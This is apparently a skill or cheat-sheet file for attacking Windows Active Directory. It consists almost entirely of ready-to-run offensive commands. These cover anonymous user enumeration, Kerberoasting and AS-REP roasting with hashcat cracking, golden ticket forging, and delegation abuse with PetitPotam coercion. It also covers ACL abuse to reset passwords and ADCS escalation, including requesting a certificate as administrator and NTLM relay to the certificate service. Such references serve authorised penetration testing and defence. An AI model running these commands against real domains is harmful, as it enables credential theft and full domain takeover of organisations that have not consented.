---
name: ad
description: Active Directory — enumeration, Kerberos abuse, ACLs, delegation, ADCS.
tags: [windows, kerberos, domain, adcs]
---
# Active Directory

## Enumerate (no creds)
- `nxc smb $DC -u '' -p '' --users --groups --shares`
- `enum4linux-ng -A $DC`; `rpcclient -U '' -N $DC -c 'enumdomusers'`
- LDAP: `ldapsearch -x -H ldap://$DC -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName`
- Null-session shares, SYSVOL scripts with creds, `nxc smb $DC --pass-pol`.

## With creds
- `nxc smb $DC -u user -p pass --users --groups --loggedon-users --sessions --shares`
- BloodHound: `bloodhound-python -u user -p pass -d corp.local -ns $DC -c All`
  Queries that pay: shortest path to Domain Admins, kerberoastable with DA, unconstrained delegation, ADCS ESC.
- `nxc ldap $DC -u user -p pass --kerberoasting out.txt --asreproast asrep.txt`

## Kerberos
- AS-REP roast: `GetNPUsers.py corp.local/ -dc-ip $DC -usersfile users.txt -no-pass -format hashcat`
- Kerberoast: `GetUserSPNs.py corp.local/user:pass -dc-ip $DC -request -outputfile tgs.txt`
- Crack: `hashcat -m 18200 asrep.txt rockyou.txt` / `-m 13100 tgs.txt`.
- Golden: `ticketer.py -nthash $KRBTGT -domain-sid $SID -domain corp.local Administrator`
- Silver: service account hash + SPN; no DC needed.
- Delegation: unconstrained (`TRUSTED_FOR_DELEGATION`) → coerce DC auth with `printerbug`/`PetitPotam`; constrained → `getST.py -spn`; RBCD → `rbcd.py` + `getST.py -impersonate administrator`.

## ACL abuse
- `dacledit.py -action read -target user -principal attacker`; look for `GenericAll`, `WriteDACL`, `ForceChangePassword`, `AddMember`, `WriteOwner`.
- `owneredit.py`, then `dacledit.py -action write`, then `net rpc password`.
- GenericWrite on a user → targeted kerberoast (set SPN, request, crack, remove).

## ADCS
- `certipy find -u user@corp.local -p pass -dc-ip $DC -vulnerable`
- ESC1: enrollee supplies subject + client auth → request as DA: `certipy req -ca $CA -template $T -upn administrator@corp.local`
- ESC8: HTTP enrollment + NTLM relay (`ntlmrelayx.py -t http://$CA/certsrv/certfnsh.asp -smb2support --adcs`).
- ESC4/7/9/10/11/13/15/16: template ACLs, `EDITF_ATTRIBUTESUBJECTALTNAME2`, CA manager approval.

## Hidden knowledge
- `nxc smb --local-auth` finds local admin reuse across hosts before domain creds.
- Machine account quota (default 10) → create a computer, RBCD without admin.
- `export KRB5CCNAME=file.ccache` before `-k -no-pass`; `klist` to confirm.
- Clock skew >5 min breaks Kerberos: `ntpdate $DC` or `rdate -n $DC`.
- Check `ms-DS-MachineAccountQuota` and `userAccountControl` flags (DONT_EXPIRE_PASSWORD, PASSWD_NOTREQD).
